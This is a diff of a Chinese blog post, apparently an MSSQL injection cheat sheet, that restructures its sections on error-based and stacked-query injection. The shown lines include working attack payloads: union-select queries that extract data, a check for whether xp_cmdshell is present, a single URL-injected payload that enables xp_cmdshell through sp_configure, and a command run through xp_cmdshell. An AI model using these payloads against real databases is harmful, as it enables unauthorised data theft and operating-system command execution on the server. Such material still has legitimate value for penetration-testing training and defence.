@@ -11,7 +11,7 @@ draft = false
  * @Author: reber
  * @Mail: 1070018473@qq.com
  * @Date: 2019-09-04 10:45:01
- * @LastEditTime: 2019-05-08 15:16:14
+ * @LastEditTime: 2019-05-08 15:24:53
  -->
 ### 0x00 基础信息探测
 ```sql
@@ -40,10 +40,10 @@ ORIGINAL_LOGIN();
 --sa
 ```
 
-### 0x01 判断是否为sa权限
-![75](/img/post/20180904-105516.png)
+### 0x01 报错注入
+* 判断是否为sa权限
+![55](/img/post/20180904-105516.png)
 
-### 0x02 报错注入
 * 得到所有数据库名字
 ![75](/img/post/20180904-110306.png)
 ```
@@ -71,7 +71,7 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 * 得到数据库test的表article的数据
 ![75](/img/post/20180904-113720.png)
 
-### 0x03 常见的SQL Server扩展存储过程 
+### 0x02 堆叠注入
 * 执行系统命令
 
 ```bash
@@ -79,10 +79,7 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 ?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell');
 
 #开启xp_cmdshell
-exec sp_configure 'show advanced options',1;
-reconfigure;
-exec sp_configure 'xp_cmdshell',1;
-reconfigure;
+?id=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;--
 
 #使用xp_cmdshell执行命令
 exec master..xp_cmdshell 'whoami';
